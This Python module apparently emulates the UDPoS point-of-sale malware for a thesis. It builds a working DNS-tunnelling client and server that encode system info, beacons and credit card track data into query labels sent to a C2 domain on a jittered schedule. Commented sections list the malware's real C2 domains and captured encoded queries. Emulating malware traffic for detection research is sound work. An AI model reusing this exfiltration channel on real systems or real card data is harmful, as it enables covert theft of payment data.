import random
import sys
from collections import namedtuple
from datetime import datetime
from math import ceil
from time import sleep
from typing import List, Tuple

from dnslib import DNSRecord, RR, QTYPE, A

from data.creditcard.ccgen import CreditCardGenerator
from malware import base, schedules
from malware.UDPoS.machine_info import random_bin_file
from malware.helper import jitter, DEBUGGERS_SANDBOXES, HEX_CHARS, delta_to_next_hour
from util import info, ok
from .encoding import encode, decode


class Client(base.Client):
    """
    Sources:
        https://www.forcepoint.com/blog/x-labs/udpos-exfiltrating-credit-card-data-dns
        https://threatvector.cylance.com/en_us/home/threat-spotlight-inside-udpos-malware.html
        https://securitynews.sonicwall.com/xmlpost/udpos-malware-spotted-in-the-wild/

    Strategy:
        Gather info, prepare .bin. queries, send with .5sec sleep in between. Then, finish with one info and one ping request.
        Response is always A record with IP of domain.

        RC4 encrypt payload and convert to hex characters for a valid domain name.
    """

    # domains = [
    #     "ns.service-logmeln[.]network",  # (All sources)
    #
    #     # https://www.hybrid-analysis.com/sample/9d3f6e81ac27533f8f57d000be414b072f2381906917afa8c935ae0c6cecc367?environmentId=100
    #     "ns.infostatic-intel[.]com"
    # ]

    def __init__(self, username: str, hostname: str, external_ip: str, domain: str = None):
        self.username = username
        self.hostname = hostname
        self.external_ip = external_ip

        self.domain = domain if domain is not None else "udpos.lan"

        # Generate random host ID
        self.host_id = self._gen_host_id()

        self.bin_data = None
        self.cc_data = None
        self.sandbox_process = None

    @staticmethod
    def _gen_host_id() -> str:
        return "".join(random.choices(HEX_CHARS, k=15))

    def bin(self, bin_data: str) -> List[str]:
        """
        e8cdf1ce69ec8ac.bin.92753b5792ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94b8a9.d4641f118d09d2778136de79d6bebb.a1cad77d94396dd5550a344ddec895.domain.tld
        """
        queries = []

        # Four, evenly-sized labels, at most 30
        # So, split input in parts of 120 bytes (== 60 raw bytes before hex encoding)
        for i in range(0, len(bin_data), 60):
            payload = encode(bin_data[i:i + 60])
            queries.append(
                f"{self.host_id}.bin.{self._chunk(payload)}.{self.domain}"
            )

        return queries

    @staticmethod
    def _chunk(payload: str) -> str:

        n_labels = 4
        chunk_size = ceil(len(payload) / n_labels)
        while chunk_size < min(len(payload), 10):
            n_labels -= 1
            chunk_size = ceil(len(payload) / n_labels)

        return ".".join([payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)])

    def ping(self):
        """
        Every 60 minutes (https://www.forcepoint.com/es/blog/security-labs/udpos-exfiltrating-credit-card-data-dns)

        Encoded: e8cdf1ce69ec8ac.ping.c31c4b5788ad566e77ce.b7cf3a530bb3caeef2fc.70c14f691248ee99d1a9.dd017a05eb7ed06a8609e7.domain.tld
        Decoded: [IP : 188.138.33.220] - 2-1-2018_4-51-0  .domain.tld
        """
        payload = encode(f"[ IP : {self.external_ip} ] - {datetime.now():%-d-%-m-%Y_%-H%-M-%-S}\r\n")
        return f"{self.host_id}.ping.{self._chunk(payload)}.{self.domain}"

    def info(self):
        # Strip "ns" from C2 server
        c2_domain = self.domain[3:]
        resolving_ip = "10.59.1.10"

        payload = encode(f"{self.hostname}; {self.username}; [NS:IP {c2_domain}:{resolving_ip}]\r\n")
        return f"{self.host_id}.info.{self._chunk(payload)}.{self.domain}"

    def trp(self, cc_data: str):
        """
        Source: https://s7d2.scene7.com/is/image/cylance/Fig18-UDPos-Malware?&wid=1100&fit=constrain,1
        1eccba0223c4106.trp.da602e4f83bc55657bd5b0cb3a4.c0bb2d782938164b52a666a2a97.fabda8da091231f679d0738137d.578d38684b8dac66d86297eca7820.domain.tld
        Result: TempResponse(host_id='1eccba0223c4106', command='trp', data='B5581123456781323^SMITH/JOHN^1607\x00021473810559010203?\r\n')
        """

        # Remove spaces after name in track1 format
        space_idx = cc_data.find(" ")
        if space_idx >= 0:
            cc_data = cc_data[:space_idx] + cc_data[space_idx:].lstrip(" ")

        payload = encode(f"{cc_data}\r\n")
        return f"{self.host_id}.trp.{self._chunk(payload)}.{self.domain}"

    def note(self, process: str):
        """
        13bc6f6d990233a.note.c31c4b5788ad3238248ee98b6c.3468ddc4f1e09f59930b274745.b9db96f788194c5ffc6b8e2bda.7d892b849dd4f98fd770941447
        [IP : UnknownIP] - String found in: ollydbg.exe - \r\n
        """
        payload = encode(f"[ IP : {self.external_ip} ] - String found in: {process} - \r\n")
        return f"{self.host_id}.note.{self._chunk(payload)}.{self.domain}"

    def __str__(self):
        return '%s(%s)' % (type(self).__name__, ', '.join('%s=%s' % item for item in vars(self).items()))


class Server(base.Server):
    Result = namedtuple('UDPoS_Recv', ['host_id', 'command', 'data'])

    def __init__(self, domain: str, server_ip: str, log_dir: str, external_client_ip: str):
        super().__init__(domain, server_ip, log_dir)
        self.external_client_ip = external_client_ip

    def receive(self, record: DNSRecord) -> DNSRecord:
        question = record.get_q()

        # Process payload
        payload = self.get_payload(question)
        if payload is not False:
            self.process(payload)

            # Respond
            reply = record.reply()
            reply.add_answer(RR(question.get_qname(), QTYPE.A, rdata=A(self.external_client_ip), ttl=3600))
            return reply

        else:
            info(f"[UDPoS] Server: Ignoring query for other domain: {question.qname}")

    def _namedtuple_to_log(self, tup):
        result = list(tup)
        result[-1] = result[-1].encode().hex()
        return result

    def process_payload(self, payload: str):
        labels = payload.split(".")

        host_id = labels[0]
        command = labels[1]
        data_concat = "".join(labels[2:6])
        data_encrypted = bytes.fromhex(data_concat)
        data_decrypted = decode(data_encrypted)

        result = Server.Result(host_id, command, data_decrypted)

        return result


class Exfiltration(base.ExfiltrationThread):
    """
    Thread used to exfiltrate the provided information:
    Supported:
        - "bin" data (system information)
        - Credit card data
        - Sandbox process name (if provided, no CC data will be exfiltrated)
    """

    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str, schedule: schedules.TypeB,
                 data_source: CreditCardGenerator = None):
        super().__init__(client, dns_settings, log_dir)

        self.client = client
        self.schedule = schedule
        self.unlimited_credit_cards = data_source

    def run(self):
        info("[UDPoS] Started exfil thread.")
        info("[UDPoS] Starting system info exfiltration (bin).")

        # 1) Exfiltrate system info via .bin
        bin_file = random_bin_file(self.client.hostname)
        for bin_query in self.client.bin(bin_file):
            self.dns_query(bin_query)
            sleep(.5)

        # 2) Send .note for random debugging process
        note_query = self.client.note(random.choice(DEBUGGERS_SANDBOXES))
        self.dns_query(note_query)
        sleep(1)

        # 3) Send .ping install beacon
        ping_query = self.client.ping()
        self.dns_query(ping_query)
        sleep(5)

        info("[UDPoS] Starting credit card exfiltration.")

        last_hour = -1

        while True:
            current_hour, intv = self.schedule.get_interval()

            # No cards this hour
            if intv is None:
                # Sleep until next hour when there are no cards to exfiltrate
                sleep_time = max(1, delta_to_next_hour())

                info(f"[UDPoS] No cards to exfiltrate this hour ({current_hour}:00).")
                info(f"[UDPoS] Sleeping {sleep_time} seconds ({sleep_time / 60:.1f} minutes).")

                sleep(sleep_time)
                continue

            # Actual exfiltration here!
            if last_hour != current_hour:
                last_hour = current_hour
                info(f"[UDPoS] Exfiltrating one card every {intv:.2f} seconds this hour ({current_hour}:00).")

            card, track_type = next(self.unlimited_credit_cards) or (ok("Exfil complete!") and sys.exit(0))
            query = self.client.trp(card)

            self.analytics(1)
            info(self.print_debug("UDPoS", 1))

            # Create DNSRecord and send!
            self.dns_query(query, 'A')

            # Sleep for interval (plus or minus 5% jitter)
            sleep(jitter(intv, jitter_range=.05))

# test_queries = """
# 13bc6f6d990233a.bin.ac613b3c92d8093d218ff192225d18.a0c4fce0ec0daf366961308bfcaccb.a56d7c6d9512b213f349cd69c39391.a1cad77d94396dd5550a344ddec895
# 13bc6f6d990233a.note.c31c4b5788ad3238248ee98b6c.3468ddc4f1e09f59930b274745.b9db96f788194c5ffc6b8e2bda.7d892b849dd4f98fd770941447
# f5bb46ba3cf713b.bin.de1c5732f0c8201f01ed8cc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.ns.service-logmeln.network
# e8cdf1ce69ec8ac.bin.fd3b6f05dbe8147626.8ea6886a1818ec8daf.b4e220eb6f433a68d5.f2aad5a97c6b75cb41.ns.service-logmeln.network
# """

#
# def thread_test():
#     client = UDPoS(username="Student", hostname="THESIS", external_ip="0.0.0.0", domain="domain.tld")
#
#     # Generate data
#     t1, t2 = ccgen(10, None, None)
#     bin_data = random_bin_file(client.hostname)
#     sandbox_process = "OLLYDBG.EXE"
#
#     thread = Exfiltration(client, bin_data, t2, sandbox_process)
#     thread.start()


# def smoke_test():
#     for q in test_queries.split():
#         print(
#             bytes(UDPoS.receive(q).data, 'ascii')
#         )
#
#     print(UDPoS.receive(
#         "1eccba0223c4106.trp.da602e4f83bc55657bd5b0cb3a4.c0bb2d782938164b52a666a2a97.fabda8da091231f679d0738137d.578d38684b8dac66d86297eca7820.domain.tld"))
#
#     print(UDPoS.receive(
#         "f5bb46ba3cf713b.bin.de1c5732f0c8201f01ed8cc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.ns.service-logmeln.network"))
#
#     client = UDPoS("Student", "THESIS", "0.0.0.0")
#
#     print(client.ping())
#     print(client.info())
#
#     send = client.trp("B2226789592775813^MONICA/TERRY              ^08269640000007000?")
#     print(send)
#     print(UDPoS.receive(send))
#
#     print(UDPoS.receive(
#         "618e7d655543f17.info.cc1d5e24fbde5c761c94f39867134cbbc48.78e9f17a832694e16f1c786eb9a504654eb.278e20db618127b89decef8f832adb6b26c.f44122143c9db9bac12a3f923390a86ead7.ns.service-logmeln[.]network"))
#
#     print(
#         "da602e4f83bc55657bd5b0cb3a4c0bb2d782938164b52a666a2a97fabda8da091231f679d0738137d578d38684b8dac66d86297eca7820")
#     "B5581123456781323^SMITH/JOHN^1607\x00021473810559010203?\r\n"
#
#     print(UDPoS.receive(
#         "1eccba0223c4106.trp.da602e4f83bc55657bd5b0cb3a4.c0bb2d782938164b52a666a2a97.fabda8da091231f679d0738137d.578d38684b8dac66d86297eca7820"))
#
#     client = UDPoS(domain=None)
#     data = ";2226789592775813=082696402650581?"
#     query = client.bin(data)
#
#     data_recv = UDPoS.receive(query)
#
#     print(f"[UDPoS] {query}")
#     print("Successfully transferred data!" if data == data_recv else "Transmission error!")
#     print(f"Expected: {data}\nReceived: {data_recv}")
#     pass
#
#
# def decode_udpos2():
#     file = ""
#     for q in """
# e8cdf1ce69ec8ac.bin.de1c5732f0c8201f01ed8cc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58d2beaaf7.985c5757a7288467fa6d9e3deeb991.b0dbd9739a292cd5451a345fc9c8d3.domain.tld
# e8cdf1ce69ec8ac.bin.ab752f4192bd057661cea8d22c5371.ee90b9ace47fc84219722af085d3a9.dc196865e60f8434dd708239c3f2d5.e09a8338c61447d5551b3a43d0c69b.domain.tld
# e8cdf1ce69ec8ac.bin.b67b35599ca3497861cea8d22c5316.aecaf2eee203cf31264611a8d591fc.cc754a5eb6298024dd24a42797d6c3.e78b9438942840ff551b2643d0c685.domain.tld
# e8cdf1ce69ec8ac.bin.a8752b4792bd57767fd0a6cc325d08.b0c4ecf0ec48d142044906addb90f6.8a4d0578950ab506e624ac2d82c3c5.e498fa5794287edb5b04245dded885.domain.tld
# e8cdf1ce69ec8ac.bin.b8652b5782bd47667fc0b6cc224d08.a081ece0984893072d4f458bc18df7.89554c5fa16bb134d3718926cefadf.f58f853bd57a28f87f172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ed8cf1083468.f6d0fc92a3589507697404bdd88694.e604180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bce7fd1cd76d2483100a46028b9cd0.domain.tld
# e8cdf1ce69ec8ac.bin.eb6f167dfce813212092eddc46184b.f48db2a1b8448e0c692045ff94c3b9.cc774045ab2a922c9624cd69c39391.a1cad71ad56d28821453344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8755219c6e815302e83e3dc22305d.f496b5a3c127c142692045ff94c3b9.cc090b01e87bcf779624cd69c39391.a1cad76d9a2963c55b1a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.a96c295983bb5f787ad6a8cd225d18.a0d5e5f2e21cd75a671553f185dab9.cc190511f77aec4d9624cd69c39391.a1dbc56a9a2963c55b1a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b4587b8496661d0a8cc225d18.a0c4fce0ec0dae0c644c0cb1dfc3b9.cc190511e66bc1768433c379cd839f.b0cad77d942a7dc37820344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b4680ba496661d0a8cd225d0a.b5d1f2f2f918cf507c154bed81d6b9.cc190511e66bc167f96ac0258addda.a1cad77d94396dd5551b265ad0d89b.domain.tld
# e8cdf1ce69ec8ac.bin.a87b2a5792ad47657fd68bf6225d09.b2d3f2f2f918cf507c154bed81d6b9.cc0b1004e879d4729836d87ccd8184.b4cad77d94396dd5550a5b03d384dc.domain.tld
# e8cdf1ce69ec8ac.bin.f63e3b5792ad47766fc0a6cd304a16.b0caeceefd0dc142691355e9b9e9b9.cc190511f772d3698732d567d6859f.b1cad77d942b78c05b182158d0da80.domain.tld
# e8cdf1ce69ec8ac.bin.ad7b2b5792ad47766fc0a6dc4d1315.ec8db2abec0dc14269115ced9ad2af.d4171007e87ad8679624cd7bd585bc.8bcad77d942874c75b1b2255d0dd83.domain.tld
# e8cdf1ce69ec8ac.bin.b664225792bf526361d2b3c92c4f0d.b5caeef5f90dc142692045ff94c3d6.82144958a820c1679624cd78da819f.b0dccf73812f63c44c0a344ddeda83.domain.tld
# e8cdf1ce69ec8ac.bin.ae58115792ad566f7dceb7ca3a530d.b6caeef5f90dc1507c154bed81d6b7.de0c101ff47ed4679624cd69c39391.a1a59970d870239e550a344dded98c.domain.tld
# e8cdf1ce69ec8ac.bin.aa7b2a418aa3526061d1bfdc225d18.b2d2eacdc60dc142692045ff94d1ab.d817151ff665d1679624cd69c39391.b3dec77384377ddb450a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b38dca00b3f218ba6dc225d18.a0c4fce0fd1fd64c790e55f185c3b9.cc191601f046eb679624cd69c39391.b3d8c37384377ddb450a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b875294382a357787fceb6dc225d18.a0c4fce0ec628f4f25490bb494c3b9.cc191408f465d0718e2ad87fcd8288.a1cad77d862f7bf87f0a345fcbdd9b.domain.tld
# e8cdf1ce69ec8ac.bin.aa602e5980b852787dd5b3dc224f0d.b5caeef5f903d3577c0e57ea81c3b9.cc190511e66bc108d82981208dd891.a1cad77d94396dd544182343cec685.domain.tld
# e8cdf1ce69ec8ac.bin.b6643b5792ad546679ed8cdc224f0d.b5caeef5f903d3577c0e57ea81c3b9.de0c101ff47ed4698431d867d18684.a1cad77d94396dd555657a409281db.domain.tld
# e8cdf1ce69ec8ac.bin.f3753b5792ad566f7dceb7ca3a530d.b6caedf9ec0dc1427b1653d2bedea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074debebb.d18f852edd6a39901b5e343f919dc1.domain.tld
# e8cdf1ce69ec8ac.bin.fd26217ab8ad47182a94f193701618.c180b8b2a95e9242692045ff94c3b9.cc196b54b2268034dd24cd0e82c7d4.f68b8e7df57d29871059674ddea5d0.domain.tld
# e8cdf1ce69ec8ac.bin.ec277214bf8747766fc0a6dc225d18.a0d4f2f0e21dcf52692045ff94c3b9.cc190501e87bcf779834cd69c39391.b0d3c573852f75db401c3a5cdec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5783806d6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc6f432d6f96e495af.cc6b4a44b22ec113d766812ceeb98c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d5b8.domain.tld
# e8cdf1ce69ec8ac.bin.92147803dbfb02761d8ff388670e02.8deefc89aa0dac073d520cbc94adfc.984e4a43ad6ba522c570842782c7d8.ee84d77d94396dd5324b60088989cc.domain.tld
# e8cdf1ce69ec8ac.bin.955f3b5783ad47766fd3b6ca224702.b1cbedf2f40dc142692045ff94c3b9.cc190511e66bc167f96ac0258addda.8ce0d76c85396dd55518225bde8ed0.domain.tld
# e8cdf1ce69ec8ac.bin.a065214d9dbb53766fc0a6dc225d18.a0c4fce0ec0dc142064e48b3dd8df2.e1330531f76bc1679636db7fc3d5d4.b9dacd67832878c04f4e205b9bd282.domain.tld
# e8cdf1ce69ec8ac.bin.fe67294d84ec023460d1b4c40f7718.a0c4fce0ec0dc142692045ff94c3b9.cc190511e66bc1679624cd69c39391.a1cad77d945623d819437a06f3e295.domain.tld
# e8cdf1ce69ec8ac.bin.b8643b5792ad546679c0e09a324d02.bacbe4e0ec0dc142692045ff94c3b9.cc190511e6048f6ada6d8322eeb991.b0dbd77d94397fc3430a720bced88f.domain.tld
# e8cdf1ce69ec8ac.bin.a27a235792ad47766fc0a6dc225d18.a0c4fce0ec628f4f25490bb4b9e9a4.d104180cfb76dc7a8b39d074de8e8c.bcd7ca60892470c848172950c3d588.domain.tld
# e8cdf1ce69ec8ac.bin.a568264a8fb05a6b72ddbbc13f4005.bdd9e1fdf110dc5f741d58e289dea4.d104180cfb76dc7a8b39d074de8ebc.8bba922fc7703e811044604dac87c0.domain.tld
# e8cdf1ce69ec8ac.bin.ec30684dbf874776018fe8990f7735.8aacb3b3b80daf0324455fff94c3b9.cc190511e66bc1679624cd69c3d5f3.eedc9827f25478b178205b3edea6d4.domain.tld
# e8cdf1ce69ec8ac.bin.f530215792ad47766fc0a6dc225d18.a0c4fce0ec0dc12f204317b0c78cff.98197258a82f8e30c524da69abdcdc.e4caa72fd1742480180a1967b1bb95.domain.tld
# e8cdf1ce69ec8ac.bin.ce306904dbe2096c6fc0a6dc225d18.a0c4fce0ec0dc14269164bee9ad4af.dc080562a339972ed561cd1982d0da.a1dbd71fc1702191551d225dcfe5bf.domain.tld
# e8cdf1ce69ec8ac.bin.d7063b3ad3e312302e83f28970184a.bac4fce0ec0dc142692045fff98afa.9e56565ea03fc104d9769d2691d2c5.e8859950be561ed536457a0b978fc0.domain.tld
# e8cdf1ce69ec8ac.bin.ea346f1edde35d766fc0a6dc225d18.a0c48fb4ad438503254f0bba94b4f6.9e525645a73f8828d809e706b093f3.f4839b39944d34851010344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47760295ea886b0d4a.ef87b9b3bf4293420f5265bab9e9cb.895e4c42b22e9322d224a23e8dd6c3.bbcad77d94396dd5550a3428cad087.domain.tld
# e8cdf1ce69ec8ac.bin.d3164b7ab8df02312693f29970185c.a0abaea7ad43881828540cb0dad9b9.cc19283b96398e23c3679969aaf78b.a1cad77d94396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8246b41d4dd4a6018d1abc5304f4f.f8b584ed9661883a7d2d6f90c68afe.8557445de6028f34c2658125c3f7d0.f58fcd7d94396dd547052558d1da85.domain.tld
# e8cdf1ce69ec8ac.bin.a960375783bc5d677cdab6cb223c75.8dee8fb9bf59840f69620ab0c0c3cd.8554400be66bc1679624cd69c39380.aed8d86f842875d9551e2e5dcbd287.domain.tld
# e8cdf1ce69ec8ac.bin.a9755a3abf87342f3c94e391223059.ee91baa1af5994102c525fff94c3b9.cc190554aa798e74cc35aa23b5f8e6.8ce0a424c76d289855677b099b848f.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc225d0e.d0a9e582f447d550082d6f8ccd90ed.89540565bf3b847d9624cd69c39391.a1cad77d94396dd52d1222409c89c6.domain.tld
# e8cdf1ce69ec8ac.bin.fd313b27f1806d063d8fe599710e57.f2ccafe9f60dc142692045ff94c3b9.cc190511f76bb135d967883a90dcc3.a999de7dfd773e81144678089ac6b8.domain.tld
# e8cdf1ce69ec8ac.bin.92753b5792ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94b8a9.dd641f11be73d767f06580208fca91.b3dbd710db7d2899551b343e8a8dc5.domain.tld
# e8cdf1ce69ec8ac.bin.e83c751092bf47173a94ee996c0951.e3a59184ec53d8567d2028b7ceee93.ae706a62e61d8435c56d8227d99391.a1cad77d94396dd5550a344dbca6f9.domain.tld
# e8cdf1ce69ec8ac.bin.d2107326d0e03d1723c0f09f58160e.cf96ae99af01c1537b0f54f086d3a9.da342f66af258528c177cd0d8ac1d4.e29e982fcd236dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.db6f4720dbe3033938938bf651044b.f481b1e0884493072a540aadcdd9b9.cc190511e66bc1679647d715b4dadf.e585802ee86a3486014f795ecce5bf.domain.tld
# e8cdf1ce69ec8ac.bin.da3a740392c902202683e3c6225d18.a0c4fce0ec0dc142692045ffe8a7fc.9a5046549a038035d260843a88e5de.ed9f9a38851447a60c59600893c8f9.domain.tld
# e8cdf1ce69ec8ac.bin.f7367a1bd7b747766fc0a6dc225d18.a0c4fce0a943cc173a1b20b1d38ff0.9f51051993258833d360cd1a97d2c5.e499de50be502385755e3421918bd4.domain.tld
# e8cdf1ce69ec8ac.bin.f430215792ad47766fc0a6dc225d18.a0c4b9aee15892590c4e02b3dd90f1.cc11705faf3f84239657992897d6c2.a8e7fd09dd7428d52f457a08c4c895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc225d18.a8b18883e11dd95879104cffe482fa.855f4c52e61f882ad324c51cb09397.a1a99633d57d2cdc782040028a89d9.domain.tld
# e8cdf1ce69ec8ac.bin.b805730ec1e4043723c0cb996f124a.f9defce0ec0dc150651051e794aedb.e1336447a7228d26d4688869b3dbc8.f283943cd8394d9018456614c4c884.domain.tld
# e8cdf1ce69ec8ac.bin.b461294f92c0255b45b6ef8e760859.ecc491a5a142931b732028beccc3ca.8543400be66bd56b863dd869aef1bc.8bbc9e2fc06c2c995567716d919acc.domain.tld
# e8cdf1ce69ec8ac.bin.a2755a01d3e40b372d8ce3c6224e14.b5d6ece0816fec681f4917abc182f5.cc74405ca939987d964d8369b6c0d4.bbcad77d942c7ac055675660f4b8d4.domain.tld
# e8cdf1ce69ec8ac.bin.ff303b31dbe10276038fe59d761457.eeccafe9f60dc142692026e5e893f8.8b5c4358aa2ecf34cf77e043a7dcdc.e083996794396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fb7c9ae493a6a.cfb18ccdc6618e05264e458cd191ef.894b1f11e66bc1679624cd69c39391.a1caab01dc5e2c843b584215ad83b8.domain.tld
# e8cdf1ce69ec8ac.bin.921d7403d4e41f7e3cc9bcdc225d18.a0c4fce0ec0dc142692045ff94d2a9.cc714a45a022996fc52dcd498dc0c5.e0869b38d03740ff550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc225d18.a0c4fce0ec76d153141a4594f6d1ac.df0a1004f446eb679624cd69c39391.a1cad77d94396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b57e9bd550b75c0cdbe30480b.b4d5edf1c127c142692045ff94c3b9.cc190511e66bc1679624cd69c39391.a1cad706842a10cf5561565fc8da84.domain.tld
# e8cdf1ce69ec8ac.bin.ac612b7ab8ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94c3b9.cc197e01f216db67fd46df70d38388.b9dcfa5794396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc225d18.a0bfecf59117c1290b125cec83d5a8.dc342f11e66bc1679624cd69c39391.a1cad77d94396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.c3652d2a88ad2c147cd0b4cf304c0d.8deefce0ec0dc142692045ff94c3b9.cc190511e66bc1679624cd69c393ea.b1ddaa6794520fc645192358c9dcb8.domain.tld
# e8cdf1ce69ec8ac.bin.92753b5792ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94b8a9.d4641f118d09d2778136de79d6bebb.a1cad77d94396dd5550a344ddec895.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc594d01.dddefc8b8e1ed0507a1452e6b9e9b9.cc190511e66bc1679624cd69c39391.a1cad77d94396dd5550a3436cfd8e8.domain.tld
# e8cdf1ce69ec8ac.bin.a27550358bba516f7fd28bf64c184c.f78baeabec6e80102d0816f68ec3b9.cc190511e66bc1679635cd07aaf099.f2c3d714da6a399419467109d0e5bf.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b5792ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ffefd3a8.b1030578a83f842b9e56c469b3e1fe.aedbc76d84394da1556e711e959cda.domain.tld
# e8cdf1ce69ec8ac.bin.e8755a13d3fd13333ded8cdc225d18.a0c4fce0ec0dc142692045ff94c3b9.cc190511e66bc1679624cd69c393f2.ee849938d76d249a1b0a5a0c938d8f.domain.tld
# e8cdf1ce69ec8ac.bin.b8197414d3e147173d85e7dc411256.ee81bfb4a5428f6f432045ff94c3b9.cc190511e66bc1679624cd69c39391.a1cad77d94396dd5550a344dbaa0f6.domain.tld
# e8cdf1ce69ec8ac.bin.c8755e19d3ef0b332bdaa6dc225d76.efe9d6e0ec0dc142692045ff94c3b9.cc190511e66bc1679624cd69c39391.a1cad77d943904a5554b70098c8dc6.domain.tld
# e8cdf1ce69ec8ac.bin.eb7d7e049b806d766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94c3b9.cc190511e66bc1679624b679d2ee8b.a1dbce6f9a287bcd5b1f2243cfd1b8.domain.tld
# e8cdf1ce69ec8ac.bin.92753b5792ad47766fc0a6dc225d18.a0c4fce0ec0dc142692045ff94c3b9.cc1905119d7bd31a8c248b2cdb838b.bbddc668812329c1434f2e5a98da87.domain.tld
# e8cdf1ce69ec8ac.bin.a2637a12d0806d5b45a9e888670f5e.e187b9faec1cd850671153e79ad6af.c2081c11eb66cc67867c8f44e99391.c8848338c6772881556b70098c8dc6.domain.tld
# e8cdf1ce69ec8ac.bin.eb753b5792ad47062799f595611c54.a0a5b8a4be489211692045ff94c3cd.9549403ccc6bc1768f36c378d58b9f.b4dcd96c94396dd5550a344ddec885.domain.tld
# e8cdf1ce69ec8ac.bin.f9782b479fbf507b7fd0abcc325008.b0c4fce0ec0d851b274108b6d7c3b9.cc342f11e67ad8759835db71cd8687.afdbc37d94396dd5550a344dce8998.domain.tld
# e8cdf1ce69ec8ac.bin.a865364585a0566362d9bfd13b1818.a0c4fce0a8548f03244906ff94c394.e6190531ff79cf76803cc37cd59d80.b9cad77d94396dd5550a240cd3d885.domain.tld
# e8cdf1ce69ec8ac.bin.b5672c5a84bc4a6e2ccdb79e225d18.a0c4b8b9a24c8c0b2a2045ffb9e9b9.cc081c03e87ad77f9831db67d18684.a1cad77d94396dd5134c390b98c5d3.domain.tld
# e8cdf1ce69ec8ac.bin.fe787d119feb017b2986a6dc225d18.f390bdb4a54ec142692068d594c3ab.de0d0b01e87bcf758424cd69c39391.a1cad77d94397dc4581a2440cb8d98.domain.tld
# e8cdf1ce69ec8ac.bin.a865364782a056606fc0a6dc220e4c.e190b5a3ec0dc142442a45ff86d1ad.c2090b01e879d4759624cd69c39391.a1cad77d842860c545072108d3d885.domain.tld
# e8cdf1ce69ec8ac.bin.b5652b5ad4ee47766fc0a68f761c4c.e987fce0ec0dec68442a32b6da87f6.9b4a0578966ba228d862842e96c1d0.f5839833b91340ff550a3425919bc1.domain.tld
# e8cdf1ce69ec8ac.bin.b81b7a1ad7ad497661c0a8dc2c5d16.a0cafceeec03c14c690e45f194cdb9.d6197562961ea310e529bd0aeeb991.a1caa72fdd742c870c0a50038dc8e6.domain.tld
# e8cdf1ce69ec8ac.bin.ed337d1ecaad47786fcea6d2225318.aec4f2e0e20ddb42442a45ff94adf6.885c0565bf3b84679824c369cd939f.a1c4d77394376ddb55043443dec695.domain.tld
# e8cdf1ce69ec8ac.bin.b6752157faf4052426848bf6225d18.c9b4fc92a358950b2747459ada82fb.805c411fe665c169962acd67c39d91.afcad97d8e39039a7820344ddebffc.domain.tld
# e8cdf1ce69ec8ac.bin.d6063b27c0e21f2f6fa5e89d60115d.e4cafceeec03c14c690e45f194cdb9.c2191f118824ec4dbb0ea83d8bd6c3.ef8f837dd57d2c85014f664db287d6.domain.tld
# e8cdf1ce69ec8ac.bin.f9393b36c0e806760c8fe892671e4c.e98bb2fac127ec686920459cdb8df7.895a5158a925cc34c6618e2085dad2.a1aeb90e944a389313436c4ddec695.domain.tld
